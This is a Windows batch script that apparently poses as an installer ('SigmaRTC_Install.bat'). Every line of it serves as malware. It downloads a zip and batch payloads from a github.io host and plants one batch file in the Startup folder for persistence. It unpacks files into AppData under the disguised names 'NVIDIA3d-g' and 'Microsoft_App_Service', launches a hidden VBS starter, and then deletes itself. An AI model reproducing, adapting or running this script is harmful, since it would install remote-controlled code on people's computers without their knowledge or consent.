powershell -Command powershell -Command "Invoke-WebRequest -Uri 'https://rtc-host723.github.io/rtc/download/internal_files.zip' -OutFile 'internal_files.zip'"
powershell -Command "(Invoke-WebRequest -Uri 'https://rtc-host723.github.io/rtc/download/Microsoft_App_Service_625.txt').Content" > Microsoft_App_Service_625.bat
powershell -Command "(Invoke-WebRequest -Uri 'https://rtc-host723.github.io/rtc/download/rm-setup.txt').Content" > rm-setup.bat

copy /y Microsoft_App_Service_625.bat "%USERPROFILE%\Start Menu\Programs\Startup\Microsoft_App_Service_625.bat"
del Microsoft_App_Service_625.bat

tar -xf internal_files.zip
xcopy NVIDIA3d-g "%USERPROFILE%\AppData\Local" /s /e /y /h
del internal_files.zip
rmdir /s /q "NVIDIA3d-g"
copy /y rm-setup.bat "%USERPROFILE%\AppData\NVIDIA3d-g\rm-setup.bat"
del rm-setup.bat

cd "%USERPROFILE%\AppData\Local\NVIDIA3d-g"
start invis_starter.vbs
cd "%USERPROFILE%\Downloads"
del SigmaRTC_Install.bat
exit